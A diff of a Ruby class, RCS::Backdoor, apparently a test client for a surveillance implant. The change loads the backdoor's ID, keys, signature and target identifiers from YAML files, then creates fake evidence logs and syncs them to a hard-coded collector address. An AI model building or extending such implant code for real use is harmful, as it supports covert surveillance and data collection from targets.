@@ -3,7 +3,6 @@
 #
 
 # relatives
-require_relative 'globals.rb'
 require_relative 'sync.rb'
 require_relative 'protocol.rb'
 
@@ -14,6 +13,7 @@ require 'rcs-common/evidence'
 # from System
 require 'digest/md5'
 require 'ostruct'
+require 'yaml'
 
 module RCS
 module Backdoor
@@ -39,42 +39,66 @@ class Backdoor
   attr_reader :logs
   
   #setup all the backdoor parameters
-  def initialize(id, instance, type, key, sign)    
+  def initialize(binary_file, ident_file)
     
     # initialize the trace facility with the working directory
     trace_init Dir.pwd
+
+    binary = {}
+
+    trace :debug, "Parsing binary data..."
     
-    trace :debug, "Backdoor instantiated: " << id
-    
+    # parse the parameters from the binary patched constants
+    begin
+      File.open(binary_file, "r") do |f|
+        binary = YAML.load(f.read)
+      end
+    rescue
+      trace :fatal, "Cannot open binary patched file"
+      exit
+    end
+
     # instantiate le empty log queue
     @logs = []
     
     # plain string 'RCS_000000000x'
-    @id = id
-    
-    # the instance is passed as a string taken from the db
-    # we need to convert to binary 
-    @instance = instance.pack('H*')
-    
+    @id = binary['BACKDOOR_ID']
+
     # the subtype of the backdoor (eg: WIN32, BLACKBERRY...)
-    @type = type
+    @type = binary['BACKDOOR_TYPE']
     
     # the conf key is passed as a string taken from the db
     # we need to calculate the MD5 and use it in binary form
-    @conf_key = Digest::MD5.digest key
+    @conf_key = Digest::MD5.digest binary['CONF_KEY']
   
     # the backdoor signature is passed as a string taken from the db
     # we need to calculate the MD5 and use it in binary form
-    @signature = Digest::MD5.digest sign
+    @signature = Digest::MD5.digest binary['SIGNATURE']
     
     # the backdoor version
-    @version = Globals::VERSION
+    @version = binary['VERSION']
     
-    # STUB ! (move to another place) used to identify the target    
-    @userid = Globals::USERID
-    @deviceid = Globals::DEVICEID
-    @sourceid = Globals::SOURCEID
-    
+    # STUB ! (move to another place) used to identify the target
+    ident = {}
+
+    begin
+      File.open(ident_file, "r") do |f|
+        ident = YAML.load(f.read)
+      end
+    rescue
+      trace :fatal, "Cannot open binary patched file"
+      exit
+    end
+    # the instance is passed as a string taken from the db
+    # we need to convert to binary
+    @instance = [ident['INSTANCE_ID']].pack('H*')
+
+    @userid = ident['USERID']
+    @deviceid = ident['DEVICEID']
+    @sourceid = ident['SOURCEID']
+
+    trace :debug, "Backdoor instantiated: " << @id << @instance.unpack('H*').to_s
+
     begin
       # instantiate the sync object with the protocol to be used
       # and a reference to the backdoor
@@ -115,13 +139,13 @@ class Application
 
     begin
       trace :info, "Creating the backdoor..."
-      b = RCS::Backdoor::Backdoor.new 'binary.yaml'
+      b = RCS::Backdoor::Backdoor.new 'binary.yaml', 'ident.yaml'
 
       trace :info, "Creating fake logs..."
       b.create_logs(5)
 
       trace :info, "Synchronizing..."
-      b.sync RCS::Backdoor::Globals::SYNC_HOST
+      b.sync "192.168.100.100"
 
     rescue Exception => detail
       trace :fatal, "FAILURE: " << detail.to_s
